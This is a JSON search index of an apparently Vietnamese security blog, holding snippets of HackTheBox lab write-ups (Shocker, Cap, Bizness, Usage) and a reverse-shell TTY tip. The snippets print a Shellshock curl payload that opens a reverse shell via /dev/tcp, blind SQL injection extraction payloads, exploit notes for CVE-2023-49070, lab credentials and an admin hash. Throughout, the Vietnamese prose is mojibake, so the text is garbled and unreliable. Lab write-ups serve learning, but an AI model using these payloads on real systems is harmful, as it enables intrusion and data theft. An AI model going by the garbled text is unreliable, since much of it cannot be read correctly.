[
  
  {
    "title": "Shocker",
    "url": "/posts/shocker/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Easy, Shocker",
    "date": "2025-01-07 00:00:00 +0700",
    





    "snippet": "MÃ´ táº£Ngáº«u há»©ng Ä‘Ãªm phia ^^. VÃ¬ nay nhá»©c chÃ¢n khÃ´ng thá»ƒ cháº¡y bá»™ theo káº¿ hoáº¡ch, chÃ¡n quÃ¡ khÃ´ng biáº¿t lÃ m gÃ¬ thÃ´i thÃ¬ lÃ m má»™t bÃ i easy cho Ä‘á»¡ chÃ¡n.LÆ°á»›t mÃ´ táº£ cá»§a cÃ¡c bÃ i easy má»™t há»“i thÃ¬ mÃ¬nh quyáº¿t Ä‘á»‹nh chá»n bÃ i nÃ y, vÃ¬ nÃ³ lÃ m mÃ¬nh nhá»› Ä‘áº¿n cÃ¡i bug huyá»n thoáº¡i thá»i nÃ o.ÄÃ¢y lÃ  mÃ´ táº£ cá»§a bÃ i lab Ä‘á»ƒ báº¡n biáº¿t cá»¥ thá»ƒ hÆ¡n mÃ¬nh Ä‘ang nÃ³i Ä‘iá»u gÃ¬ :)))AttackReconNhÆ° thÆ°á»ng lá»‡, váº«n lÃ  nmap.Váº«n lÃ  port 80 quen thuá»™c. Truy cáº­p web thÃ´i.Giao diá»‡n web cÅ©ng khÃ´ng cÃ³ gÃ¬ vui. NhÆ° má»™t thÃ³i quen thá»i sinh viÃªn, dirsearch thá»­ xem cÃ³ thÆ° má»¥c hay file nÃ o hay ho khÃ´ng.Káº¿t quáº£ tá»« gobuster cÅ©ng vá»n váº¹n nhiÃªu Ä‘Ã¢y. Ã€ hÃ¡ cÃ³ cgi-bin kÃ¬a. Thá»­ dirsearch phÃ¡t ná»¯a xem cÃ³ gÃ¬ hot.Ã‚y da, lÃ²i ra má»™t file .sh.Truy cáº­p vÃ o thÃ¬ chá»‰ cÃ³ báº¥y nhiÃªu thÃ´ng tin =&amp;gt; HÆ¡i tháº¥t vá»ng.Just an uptime test script -&amp;gt; Ä‘Ã¢y cÃ³ váº» nhÆ° lÃ  má»™t lá»‡nh nÃ o Ä‘Ã³ cá»§a linux. ÄÃºng rá»“i Ä‘Ã³ lÃ  lá»‡nh uptime.Exploit ShellshockMÃ  á»§a â€œlÃ m váº­y Ä‘á»ƒ lÃ m chi ?â€, tháº­t sá»± tá»›i Ä‘Ã¢y mÃ¬nh chÆ°a hiá»ƒu Ä‘Æ°á»£c váº¥n Ä‘á» á»Ÿ Ä‘Ã¢y lÃ  gÃ¬ ? ThÃ´i thÃ¬ táº¡m Ä‘á»ƒ nÃ³ qua má»™t bÃªn váº­y.Nhá»› láº¡i Ä‘oáº¡n mÃ´ táº£ cá»§a bÃ i lab nÃ y cÃ³ nháº¯c Ä‘áº¿n Shellshock exploit. ÄÃ¢y cÅ©ng chÃ­nh lÃ  lá»— há»•ng trong truyá»n thuyáº¿t mÃ  mÃ¬nh Ä‘Ã£ nháº¯c á»Ÿ Ä‘áº§u bÃ i viáº¿t. Cá»© thá»­ exploit thá»­ xem sao Ä‘Ã£.Ngol lá»¥m luÃ´n.Flag 1Flag 1: 94f6590c169a65d3375d01d7b2786046PrivilegesVáº«n nhÆ° thÃ³i quen há»“i Ä‘áº¡i há»c. Cá»© há»… nghÄ© Ä‘áº¿n leo quyá»n lÃ  nhanh tay gÃµ lá»‡nh sudo -l.May thay Ä‘Ã¢y cÅ©ng lÃ  má»™t lab dáº¡ng easy nÃªn cÃ³ ngay káº¿t quáº£ chÆ°a má»™t binary cÃ³ thá»ƒ dÃ¹ng quyá»n sudo mÃ  khÃ´ng cáº§n password.Chuyá»‡n leo quyá»n bÃ¢y giá» trá»Ÿ nÃªn Ä‘Æ¡n giáº£n hÆ¡n rá»“i. Viá»‡c cÃ²n láº¡i lÃ  viáº¿t má»™t payload sá»­ dá»¥ng perl call tá»›i /bin/bash nhÆ° ngÆ°á»i dÃ¹ng root lÃ  xong.Do lÃ  gom chung vÃ o 1 payload khÃ¡ lÃ  khÃ³ cháº¹o nÃªn mÃ¬nh quyáº¿t Ä‘á»‹nh reverse shell vÃ o user shelly rá»“i sau Ä‘Ã³ leo quyá»n cho dá»….Payload: curl -A &#39;() { :; }; echo; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.14/2804 0&amp;gt;&amp;amp;1&#39; http://10.129.206.242/cgi-bin/user.sh.Flag 2Flag 2: bb1604537f6b21a35dab9402628b959a."
  },
  
  {
    "title": "Cap",
    "url": "/posts/cap/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Cap",
    "date": "2024-12-24 00:00:00 +0700",
    





    "snippet": "MÃ´ táº£VÃ o má»™t buá»•i chiá»u Noen dá»± tÃ­nh vá» sá»›m chá»Ÿ báº¡n ngÆ°á»i yÃªu Ä‘i chÆ¡i nhÆ°ng váº«n chÆ°a tá»›i giá» tan ca nÃªn mÃ¬nh nÃ¡n láº¡i 1 xÃ­u lÃ m nháº¹ 1 bÃ i HTB easy.ÄÃ¢y lÃ  má»™t sá»‘ thÃ´ng tin Ã­t á»i vá» mÃ´ táº£ cá»§a bÃ i nÃ y.AttackReconCÅ©ng nhÆ° thÆ°á»ng lá»‡ vá»›i cÃ¡c option cÅ© kÄ©, mÃ¬nh váº«n tiáº¿p tá»¥c nmap xem ip mÃ  bÃ i lab cung cáº¥p cÃ³ nhá»¯ng dá»‹ch vá»¥ nÃ o hot khum.ChÃºng ta cÃ³ 3 dá»‹ch vá»¥ ftp, ssh, http.NhÆ° thÆ°á»ng lá»‡ thÃ¬ mÃ¬nh váº«n vÃ´ xem web cÃ³ gÃ¬ vui khÃ´ng.ChÃºng ta cÃ³ má»™t dashboard. MÃ  cÃ³ váº» web auto login cho mÃ¬nh vÃ o user nathan.Má»™t chá»©c nÄƒng cÃ³ thá»ƒ down dá»¯ liá»‡u cá»§a 1 file pcap nÃ o Ä‘Ã³. Tuy nhiÃªn URL cá»§a chá»©c nÄƒng nÃ y cÃ³ Ä‘i kÃ¨m id -&amp;gt; Ä‘á»ƒ xÃ­u ná»¯a mÃ¬nh bruteforce thá»­ xem.Má»™t chá»©c nÄƒng show ipconfig tá»« server cá»§a á»©ng dá»¥ng.Cuá»‘i cÃ¹ng lÃ  chá»©c nÄƒng hiá»‡n thá»‹ káº¿t quáº£ cá»§a lá»‡nh netstat tá»« server cá»§a á»©ng dá»¥ng.=&amp;gt; Äa pháº§n lÃ  nhá»¯ng chá»©c nÄƒng hiá»‡n thá»‹, khÃ´ng cÃ³ gÃ¬ hot. VÃ¬ tháº¿ mÃ¬nh quyáº¿t Ä‘á»‹nh quay láº¡i bruteforce thá»­ cÃ¡i id á»Ÿ chá»— download pcap xem sao.IDORBan Ä‘áº§u tÃ­nh dÃ¹ng intruder cá»§a burp bruteforce cho láº¹ mÃ  khÃ´ng hiá»ƒu sao cá»© send láº¡i request thÃ¬ bá»‹ redirect vá» láº¡i dashboard -&amp;gt; á»©c cháº¿ dev luÃ´n cÃ¡i request cho rá»“i.MÃ¬nh cho cháº¡y 100 id láº­n Ã¡ mÃ  má»›i máº¥y id Ä‘áº§u Ä‘Ã£ tháº¥y Ä‘a sá»‘ cÃ³ data rá»“i nÃªn thÃ´i mÃ¬nh dá»«ng á»Ÿ Ä‘Ã¢y check thá»­ cÃ¡c file nÃ y xem sao Ä‘Ã£.Data leak in pcap fileTheo thá»© tá»± trÃªn xuá»‘ng thÃ´i. QuÄƒng thá»­ file 0.pcap vÃ o wireshare xem cÃ³ gÃ¬ hot.NhÃ¬n cÅ©ng khÃ¡ loáº¡n láº¡c, tuy nhiÃªn vÃ´ tÃ¬nh tháº¥y Ä‘Æ°á»£c gÃ³i FPT cÃ³ cÃ¡i request user gÃ¬ Ä‘Ã³.Connect FTP to get Flag 1Tá»± nhiÃªn hÃºp Ä‘Æ°á»£c cÃ¡i tÃ i khoáº£n FTP ngon Æ¡ -&amp;gt; Ä‘Ãºng lÃ  bÃ i easy kkkkk. nathan:Buck3tH4TF0RM3!.Connect ftp vÃ  lá»¥m cÃ¡i flag thÃ´i.FLAG 1: 9bcc822579143b2d297464daa2579146.SSHNhá»› láº¡i ban nÃ£y lÃºc recon mÃ¬nh cÃ²n má»™t dá»‹ch vá»¥ SSH. Thá»­ SSH vá»›i tÃ i khoáº£n FTP vá»«a tÃ¬m Ä‘Æ°á»£c xem cÃ³ Ä‘Æ°á»£c hay khÃ´ng.ÄÃ´i khi nhá»¯ng Ä‘iá»u vÃ´ tÃ¬nh nÃ³ tá»›i tháº­t Ä‘Ãºng lÃºc kkkkk.PrivilegesVÃ¬ lÆ°á»i qÃ¡ nÃªn mÃ¬nh sá»­ dá»¥ng linpeas.sh Ä‘á»ƒ scan xem server cÃ³ thÃ´ng tin gÃ¬ nháº¡y cáº£m cÃ³ thá»ƒ leo quyá»n Ä‘Æ°á»£c hay khÃ´ng.linpeas Ä‘Ã£ Ä‘Æ°á»£c mÃ¬nh copy vÃ o vÃ  phÃ¢n quyá»n thá»±c thi.PhÃ¡t hiá»‡n ra file binary python3.8 cÃ³ chá»©a capability cap_setuid. Cho báº¡n nÃ o chÆ°a biáº¿t thÃ¬ Ä‘Ã¢y lÃ  má»™t capability cho phÃ©p chÆ°Æ¡ng trÃ¬nh thay Ä‘á»•i UID (User ID). Äiá»u nÃ y cho phÃ©p chÆ°Æ¡ng trÃ¬nh giáº£ dáº¡ng thÃ nh má»™t ngÆ°á»i dÃ¹ng khÃ¡c.Tháº¿ thÃ¬ mÃ¬nh thá»­ nháº¹ má»™t script python cÆ¡ báº£n Ä‘á»ƒ thay Ä‘á»•i uid xem nhÆ° tháº¿ nÃ o ?Tháº­t Ä‘Ãºng lÃ  má»™t bÃ i easy ^-^Cat Flag 2FLAG 2: 853e6653ed9ebe66dfa7f63cfb9d9b1f"
  },
  
  {
    "title": "NÃ¢ng cáº¥p raw shell (non-interactive shell) lÃªn TTY shell (pseudo shell)",
    "url": "/posts/TTY-SHELL/",
    "categories": "Tips - Trick",
    "tags": "",
    "date": "2024-11-07 00:00:00 +0700",
    





    "snippet": "Revere shellSau khi get shell thÃ nh cÃ´ng mÃ¬nh sáº½ sá»­ dá»¥ng python Ä‘á»ƒ khá»Ÿi táº¡o TTY (trong trÆ°á»ng há»£p server victim khÃ´ng cÃ³ python thÃ¬ chá»‹u ğŸ˜…).python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;Out Reverse shellSau Ä‘Ã³ Ctrl+Z Ä‘á»ƒ suspended lá»‡nh nc(gá»i nÃ´m na lÃ  Ä‘Æ°a lá»‡nh nc vÃ o cháº¿ Ä‘á»™ cháº¡y ná»n). VÃ  thoÃ¡t khá»i shell Ä‘ang listen. Äá»©ng trÃªn shell local tiáº¿p tá»¥c gÃµ lá»‡nh:stty raw -echo;fgGiáº£i thÃ­ch má»™t chÃºt thÃ¬ stty lÃ  má»™t command trÃªn linux dÃ¹ng Ä‘á»ƒ cáº¥u hÃ¬nh thiáº¿t bá»‹ Ä‘áº§u cuá»‘i (terminal). CÃ¡c tuá»³ chá»n raw, -echo Ä‘á»ƒ Ä‘iá»u chá»‰nh cÃ¡ch terminal xá»­ lÃ½ Ä‘áº§u vÃ o Ä‘áº§u ra:raw: Chuyá»ƒn terminal sang cháº¿ Ä‘á»™ raw shell.-echo: Táº¯t cháº¿ Ä‘á»™ echo trÃªn terminal.fg sáº½ Ä‘Æ°a tiáº¿n má»™t tiáº¿n trÃ¬nh Ä‘ang cháº¡y ná»n trá»Ÿ láº¡i Ä‘á»ƒ báº¡n cÃ³ thá»ƒ thao tÃ¡c trá»±c tiáº¿p vá»›i nÃ³, tiáº¿n trÃ¬nh Ä‘Ã³ trong trÆ°á»ng há»£p nÃ y lÃ  lá»‡nh nc.Come back Reverse shellSau khi trá»Ÿ láº¡i shell báº¡n cÃ³ thá»ƒ cáº¥u hÃ¬nh thÃªm cho shell cá»§a báº¡n Ä‘á»ƒ dá»… thao tÃ¡c Ä‘á»‘i vá»›i báº¡n nháº¥t báº±ng cÃ¡ch khai bÃ¡o biáº¿n mÃ´i trÆ°á»ng TERM vÃ  thÃªm giÃ¡ trá»‹ cho nÃ³.Äá»‘i vá»›i mÃ¬nh thÃ¬ mÃ¬nh chá»‰ cáº§n nÃ³ thÃªm tÃ­ mÃ u mÃ¨ ná»¯a lÃ  á»•n. Báº¡n nÃ o muá»‘n giá»‘ng mÃ¬nh thÃ¬ cÃ³ thÃªm run thÃªm command nÃ y sau khi trá»Ÿ láº¡i shell trÃªn victim.export TERM=xterm-256colorChÃºc cÃ¡c báº¡n phÃ¡ server cá»§a ngÆ°á»i khÃ¡c vui váº» khi custom Ä‘Æ°á»£c shell nhÆ° Ã½ cÃ¡c báº¡n mong muá»‘n ğŸ¤ŸğŸ»ğŸ¤ŸğŸ»ğŸ¤ŸğŸ»"
  },
  
  {
    "title": "Bizness",
    "url": "/posts/bizness/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Bizness",
    "date": "2024-10-18 00:00:00 +0700",
    





    "snippet": "MÃ´ táº£Váº«n nhÆ° má»¥c tiÃªu Ä‘áº·t ra má»—i tuáº§n má»™t bÃ i HTB nÃªn hÃ´m nay, trÃ¹ng há»£p lÃ  láº¡i vÃ o chiá»u t6 rÃ£nh rá»—i, mÃ¬nh sáº½ giáº£i má»™t bÃ i HTB má»©c easy nÃ y.Äá»c nháº¹ qua machine má»™t xÃ­ thÃ¬ cÃ³ váº» cÅ©ng khÃ¡ Ä‘Æ¡n giáº£n.AttackReconnmapKhai bÃ¡o domain bizness.htb vÃ o file hosts vÃ  truy cáº­p web tá»« trÃ¬nh duyá»‡t xem cÃ³ gÃ¬ hÃºp Ä‘Æ°á»£c hay khÃ´ng.ÄÃ¢y cÃ³ váº» nhÆ° lÃ  má»™t site quáº£ng bÃ¡ cho má»™t doanh nghiá»‡p nÃ o Ä‘Ã³.Xem thá»­ nÃ³ Ä‘ang dÃ¹ng nhá»¯ng cÃ´ng nghá»‡ nÃ o ?NÃ³ Ä‘ang cháº¡y Java vá»›i dá»‹ch vá»¥ web lÃ  Nginx.Chá»£t nhá»› Ä‘áº¿n pháº§n mÃ´ táº£ vá» machine á»Ÿ Ä‘áº§u bÃ i viáº¿t nÃ y. NÃ³ cÃ³ nháº¯c Ä‘áº¿n CVE-2023-49070. Search vÃ  tÃ¬m hiá»ƒu vá» CVE nÃ y xem cÃ³ gÃ¬ vui.NÃ´m na Ä‘Ã¢y lÃ  má»™t lá»— há»•ng unauthentication to RCE trong Apache Ofbiz trÆ°á»›c version 18.12.09.ExploitPOC cÅ©ng Ä‘Ã£ cÃ³ sáºµn á»Ÿ github sau quÃ¡ trÃ¬nh search google cá»§a mÃ¬nh.Tuy nhiÃªn, ban Ä‘áº§u mÃ¬nh há»›n ha há»›n há»Ÿ clone git vá» vÃ  exploit nhÆ°ng khÃ´ng thÃ nh cÃ´ng ğŸ˜¥ğŸ˜¥ğŸ˜¥ (hÃ¬nh dÆ°á»›i nÃ³ bÃ¡o váº­y thÃ´i chá»© netcat cá»§a mÃ¬nh váº«n chÆ°a báº¯t Ä‘Æ°á»£c connect).KhÃ´ng hiá»ƒu lÃ½ do táº¡i sao, nÃªn chui vÃ o file exploit.py Ä‘á»c xem ntn (idea cá»§a mÃ¬nh lÃºc áº¥y lÃ  tÃ­nh attack manual vÃ¬ khÃ´ng pháº£i lÃºc nÃ o POC sáºµn cÅ©ng cháº¡y Ä‘Æ°á»£c).á»œ thÃ¬ nÃ´m na nÃ³ dÃ¹ng endpoint /webtools/control/ping;/?USERNAME=&amp;amp;PASSWORD=&amp;amp;requirePasswordChange=Y Ä‘á»ƒ scan xem website cÃ³ tá»“n táº¡i lá»— há»•ng hay khÃ´ng. Sau Ä‘Ã³ nÃ³ sá»­ dá»¥ng ysoserial Ä‘á»ƒ táº¡o payload rá»“i parse ná»™i dung ra dáº¡ng xml vÃ  Ä‘áº©y lÃªn theo Ä‘Æ°á»ng xmlrpc.LÃ½ do mÃ¬nh exploit khÃ´ng thÃ nh cÃ´ng lÃ  vÃ¬ mÃ¬nh Ä‘ang sá»­ dá»¥ng version java 21.0.1 mÃ  tÆ°Æ¡ng á»©ng vá»›i lá»‡nh java trong code thÃ¬ pháº£i lÃ  version Java 8. Äá»‘i vá»›i cÃ¡c version Java 9 trá»Ÿ Ä‘i thÃ¬ mÃ¬nh pháº£i tá»± add thÃªm cÃ¡c module thÃ´ng qua option. VÃ¬ váº­y nÃªn mÃ¬nh Ä‘Ã£ thÃªm vÃ o cÃ¡c option cho command java trong code:--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMEDBÃ¢y giá» cháº¡y láº¡i vÃ  láº¥y shell thÃ´i.Yeah ğŸ¤ŸğŸ»ğŸ¤ŸğŸ»ğŸ¤ŸğŸ» ngon lÃ nh.Flag 1 trong táº§m tay.Privilege EscalationMay thay vá»«a get RCE xong mÃ¬nh Ä‘á»©ng ngay path cá»§a ofbiz luÃ´n.Lá»¥c lá»i kháº¯p path xem cÃ³ gÃ¬ hot hay khum nhÃ©.Source cÅ©ng nhiá»u thá»© qÃ¡, mÃ¬nh má»›i Ä‘i Ä‘Æ°á»£c nhá»¯ng cÃ¡i tÃªn cáº£m tháº¥y kháº£ nghi nhÆ°ng chÆ°a tháº¥y gÃ¬ hot ngoÃ i máº¥y cÃ¡i user:pass file README.adoc nhÆ°ng Ä‘Ã³ cÅ©ng lÃ  nhá»¯ng account default. CÃ³ acc admin:ofbiz cÅ©ng lÃ  acc default vÃ  mÃ¬nh thá»­ login theo Ä‘Æ°á»ng dáº«n admin https://bizness.htb/webtools/control/login nhÆ°ng khÃ´ng thÃ nh cÃ´ng. ThÃ´i Ä‘á»ƒ cháº¡y vá» nhÃ  rá»“i máº§n tiáº¿p sau â€¦â€¦â€¦"
  },
  
  {
    "title": "Usage",
    "url": "/posts/usage/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Usage",
    "date": "2024-10-11 00:00:00 +0700",
    





    "snippet": "MÃ´ táº£ğŸ¤ŸğŸ»ğŸ¤ŸğŸ»ğŸ¤ŸğŸ» Yeah vÃ o thá»© 6 ngÃ y 11 chá»© k pháº£i 13 nhÃ© ğŸ‘», sau khi hoÃ n thÃ nh cÃ´ng viá»‡c Ä‘Æ°á»£c giao á»Ÿ cty cÃ²n chÃºt thá»i gian buá»•i chiá»u mÃ¬nh lÃ m nháº¹ má»™t bÃ i HackTheBox, nhÆ° báº¡n Ä‘Ã£ biáº¿t vÃ  tÃ¬m kiáº¿m vá» nÃ³ thÃ¬ Ä‘Ãºng rá»“i bÃ i HTB nÃ y cÃ³ tÃªn lÃ  Usage.Äá»c sÆ¡ vá» thÃ´ng tin machine tÃ´i biáº¿t Ä‘Æ°á»£c ráº±ng machine nÃ y lÃ  má»™t linux server vÃ  Ä‘ang deploy má»™t web site blog cÃ³ tá»“n táº¡i lá»— há»•ng SQL Injection. VÃ  cÃ²n nhiá»u Ä‘iá»u thÃº vá»‹ khÃ¡c nhÆ° hÃ¬nh bÃªn dÆ°á»›i.AttackStart machine tÃ´i nháº­n Ä‘Æ°á»£c má»™t IP: 10.129.5.101ReconNhÆ° cÃ¡c thanh niÃªn má»›i táº­p tÃ nh lÃ m hacker, tÃ´i tiáº¿n hÃ nh scan nmap Ä‘á»ƒ xem ip trÃªn Ä‘ang cháº¡y nhá»¯ng dá»‹ch vá»¥ nÃ o.Viá»‡c scan nmap trÃªn mÃ¡y tÃ´i cÃ³ váº» khÃ¡ lÃ¢u, trong lÃºc chá» Ä‘á»£i thá»­ truy cáº­p ip Ä‘Ã³ vÆ¡i port 80 vÃ o trÃ¬nh duyá»‡t thá»­ xem cÃ³ gÃ¬ hay ho khum (báº£n nÄƒng cá»§a má»™t web application pentester).TÃ´i bá»‹ dÃ¬ Ä‘ai dÃ©c (redirect) qa domain usage.htb nhÆ° hÃ¬nh trÃªn. KhÃ´ng láº½ pháº£i khai bÃ¡o host cho ip Ä‘Ã³ thÃ¬ má»›i cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c hay sao ? Thá»­ khai bÃ¡o thÃªm host (cho báº¡n nÃ o chÆ°a biáº¿t, cÃ¡c báº¡n cÃ³ thá»ƒ khai bÃ¡o host táº¡i file /etc/hosts Ä‘á»‘i vá»›i linux, cÃ²n windows báº¡n cÃ³ thá»ƒ google thÃªm nhÃ©, mÃ¬nh qÃªn máº¥t path windows ráº§u ğŸ˜…) vÃ  truy cáº­p láº¡i xem nhÆ° tháº¿ nÃ o nhÃ©.May quÃ¡ tÃ´i truy cáº­p Ä‘Æ°á»£c rá»“i. CÃ¹ng lÃºc Ä‘Ã³ nmap cá»§a tÃ´i cÅ©ng Ä‘Ã£ cho káº¿t quáº£.Tiáº¿n hÃ nh scan sÃ¢u thÃªm xÃ­u Ä‘á»ƒ láº¥y thÃªm má»™t vÃ i thÃ´ng tin vá» 2 dá»‹ch vá»¥ 22 vÃ  80.CÅ©ng khÃ´ng cÃ³ gÃ¬ qÃ¡ Ä‘áº·c sáº¯c, quay láº¡i vs cÃ¡i site usage.htb tÃ´i vá»«a truy cáº­p Ä‘Æ°á»£c.Äi má»™t vÃ²ng site Ä‘Ã³ tÃ´i collect láº¡i cÃ¡c endpoint nhÆ° sau:GET: /dashboardGET: /loginGET: /registrationGET: /forget-passwordGET: admin.usage.htb/POST: /post-loginPOST: /post-registrationPOST: /forget-passwordFuzzingTá»« kinh nghiá»‡m non ná»›t cá»§a má»™t redteam má»›i vÃ o nghá», tÃ´i sáº½ Æ°u tiÃªn fuzz cÃ¡c lá»— há»•ng server side trÆ°á»›c Ä‘á»ƒ nhanh chÃ³ng RCE Ä‘Æ°á»£c. CÃ¡c payload cÆ¡ báº£n cá»§a cÃ¡c bug server side Ä‘á»u cÃ³ sáºµn á»Ÿ seclists.Fuzz qua má»™t vÃ²ng tÃ´i Ä‘Ã£ phÃ¡t hiá»‡n lá»— há»•ng SQLi á»Ÿ form forget password. LÆ°á»i khai thÃ¡c quÃ¡ :))) =&amp;gt; SQLMAP cho láº¹ thÃ´i ğŸ¤£ğŸ¤£ğŸ¤£SQL InjectionKáº¿t quáº£ SQLmap Ä‘Ã£ ra nhÆ° v rá»“i thÃ¬ cÃ²n nghi ngá» gÃ¬ ná»¯a mÃ  k attack tháº³ng luÃ´n â˜ºï¸ThÃªm cÃ¡c option tools gá»£i Ã½ vÃ  xÃºc thÃ´iá» Ä‘Ã¢y mÃ¬nh trá» proxy vá» burp cho dá»… theo dÃµi payload.Sqlmap cháº¡y khÃ¡ lÃ¢u nÃªn mÃ¬nh Ä‘Ã£ Ä‘i cf má»™t lÃºc :))). Sau khi cf vá» thÃ¬ káº¿t quáº£ cho tháº¥y chÃºng ta cÃ³ má»™t SQLi blind vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u lÃ  mysqlLáº¡i pháº£i trÃ´ng cáº­y vÃ o sqlmap Ä‘á»ƒ dump db vá» thÃ´i chá»© mÃ¬nh lÆ°á»i khai thÃ¡c tay hoáº·c viáº¿t tool quÃ¡ kkkk.Sá»‘ trá»i báº¯t mÃ¬nh pháº£i khai thÃ¡c báº±ng tay rá»“i cÃ¡c báº¡n Æ¡i. Dump sá»­ dá»¥ng cáº£ wordlist nhÆ°ng váº«n khÃ´ng thÃ nh cÃ´ng.ThÃ´i thÃ¬ mÃ¬nh sáº½ táº­n dá»¥ng láº¡i cÃ¡i payload mÃ  sqlmap cung cáº¥p Ä‘á»ƒ khai thÃ¡c tiáº¿p báº±ng tay (manual) váº­y.Tá»•ng há»£p láº¡i má»™t tÃ­ thÃ¬ Ä‘Ã¢u lÃ  SQLi blind vÃ  payload mÃ  sqlmap cung cáº¥p á»Ÿ dáº¡ng error base. MÃ¬nh paste láº¡i payload Ä‘á»ƒ phÃ¢n tÃ­ch má»™t tÃ½.&#39; AND EXTRACTVALUE(9050,CASE WHEN (9050=9050) THEN 9050 ELSE 0x3A END) AND &#39;iBUN&#39;=&#39;iBUNNÃ³ sá»­ dá»¥ng hÃ m EXTRACTVALUE, Ä‘Ã¢y lÃ  má»™t hÃ m trong háº§u háº¿t cÆ¡ sá»Ÿ dá»¯ liá»‡u mÃ  cá»¥ thá»ƒ á»Ÿ Ä‘Ã¢y lÃ  mysql. NÃ³ dÃ¹ng Ä‘á»ƒ láº¥y dá»± liá»‡u tá»« má»™t tÃ i liá»‡u XML vá»›i 2 tham sá»‘ Ä‘áº§u vÃ o.Tham sá»‘ Ä‘áº§u tiÃªn thÆ°á»ng sáº½ lÃ  má»™t tÃ i liá»‡u XML hoáº·c lÃ  má»™t sá»‘ báº¥t ká»³ nÃ o Ä‘Ã³.Tham sá»‘ thá»© 2 sáº½ lÃ  XPATH trá» Ä‘áº¿n tÃ i liá»‡u Ä‘Ã³.Trong payload nÃ y 2 tham sá»‘ láº§n lÆ°á»£t sáº½ lÃ  9050 vÃ  CASE WHEN (9050=9050) THEN 9050 ELSE 0x3A END)MÃ¬nh sáº½ phÃ¢n tÃ­ch vÃ o tham sá»‘ thá»© 2 nhÃ©. ÄÃ¢y lÃ  má»™t biá»ƒu thá»©c Ä‘iá»u kiá»‡n, náº¿u 9050=9050 =&amp;gt; luÃ´n Ä‘Ãºng thÃ¬ sáº½ tráº£ vá» 9050 ngÆ°á»£c láº¡i sáº½ tráº£ vá» 0x3A lÃ  mÃ£ hex cá»§a :.Bá» vÃ o burp thá»­ chÃºng ta sáº½ nháº­n ra ráº±ng trong trÆ°á»ng há»£p Ä‘Ãºng response sáº½ cÃ³ mÃ£ 302 ngÆ°á»£c láº¡i sáº½ lÃ  500.OK. BÃ¢y giá» sáº½ edit láº¡i payload Ä‘á»ƒ get version thá»­ nhÃ©. TrÆ°á»›c tiÃªn mÃ¬nh sáº½ tÃ¬m Ä‘á»™ dÃ i cá»§a version sáº½ cÃ³ bao nhiÃªu kÃ½ tá»± vÃ  payload tÃ¬m Ä‘á»™ dÃ i nhÆ° sau:&#39; AND EXTRACTVALUE(9050,CASE WHEN ((select length(@@version))&amp;gt;20) THEN 9050 ELSE 0x3A END) AND &#39;iBUN&#39;=&#39;iBUNKáº¿t quáº£ cá»§a payload trÃªn tráº£ vá» 302 cÃ³ nghÄ©a lÃ  Ä‘Ãºng, Ä‘á»™ dÃ i cá»§a version mysql lá»›n hÆ¡n 20 kÃ½ tá»±. Tiáº¿p tá»¥c fuzz Ä‘áº¿n khi nÃ o ra Ä‘á»™ dÃ i chÃ­nh xÃ¡c thÃ¬ thÃ´i. =&amp;gt; Ä‘á»™ dÃ i chÃ­nh xÃ¡c lÃ  23Má»¥c tiÃªu chÃ­nh cá»§a mÃ¬nh Ä‘Ã¢u pháº£i chá»‰ tÃ¬m version Ä‘Ã¢u Ä‘Ãºng k ? Cho nÃªn viá»‡c xÃ¡c Ä‘á»‹nh Ä‘á»™ dÃ i chá»‰ Ä‘á»ƒ chá»©ng minh ráº±ng idea sá»­a payload cá»§a mÃ¬nh thÃ nh cÃ´ng. Tiáº¿p tá»¥c vá»›i idea Ä‘Ã³ mÃ¬nh sáº½ Ä‘i tÃ¬m táº¥t cáº£ cÃ¡c table cÃ³ trong db mysql.Vá»›i payload dÆ°á»›i Ä‘Ã¢y mÃ¬nh sáº½ sá»­ dá»¥ng intruder cá»§a burp Ä‘á»ƒ bruteforce tá»«ng kÃ½ tá»± vá»›i Ä‘á»™ dÃ i 371 cho má»—i vá»‹ trÃ­ cá»§a cÃ¡c table cÃ³ trong db mysql. Payload: ` AND EXTRACTVALUE(9050,CASE WHEN ((select substr(group_concat(table_name),1,1) from information_schema.tables WHERE table_schema != â€˜information_schemaâ€™)=â€™gâ€™) THEN 9050 ELSE 0x3A END) AND â€˜iBUNâ€™=â€™iBUN`.Ngol lÃ nh, sáº¿p xáº¿p láº¡i 1 tÃ½ Ä‘á»ƒ cÃ³ full table thÃ´i nÃ o.VÃ  Ä‘Ã¢y lÃ  danh sÃ¡ch table cÃ³ trong db mysql mÃ  mÃ¬nh vá»«a dump Ä‘Æ°á»£c.global_status,global_variables,persisted_variables,processlist,session_account_connect_attrs,session_status,session_variables,variables_info,admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users,blog,failed_jobs,migrations,password_reset_tokens,personal_access_tokens,usersTá»« Ä‘Ã¢y mÃ¬nh sáº½ focus vÃ o 2 table admin_user vÃ  users Ä‘áº§u tiÃªn Ä‘áº¿n xem hÃºp Ä‘Æ°á»£c gÃ¬ khÃ´ng. Tiáº¿p tá»¥c tÃ¬m column vÃ  dump data 2 table Ä‘Ã³.  Column name table users: id,name,email,email_verified_at,password,remember_token,created_at,updated_atColumn name table admin_users: Id,username,password,name,avatar,remember_token,created_at,updated_atBáº£ng admin_users chá»‰ cÃ³ Ä‘Ãºng má»™t dÃ²ng vá»›i user,pass: admin:$2y$10$ohq2klpbh/ri.p5wr0p3uomc24ydvl9da9h1s6ooomgh5xvfuprl2ÄÃ£ cÃ³ pass dáº¡ng hash, mÃ¬nh k biáº¿t Ä‘Ã¢y lÃ  dáº¡ng mÃ£ hoÃ¡ nÃ o. ThÃ´i thá»­ cá»© Ä‘á»ƒ hashcat detect xem sao. NhÆ°ng trÆ°á»›c tiÃªn tÃ´i sáº½ thá»­ vá»›i cÃ¡c cÃ´ng cá»¥ online trÆ°á»›c.CÃ´ng cá»¥ crack online báº£o mÃ¬nh ráº±ng Ä‘Ã¢y lÃ  má»™t bcrypt nhÆ°ng nÃ³ k crack Ä‘Æ°á»£c. 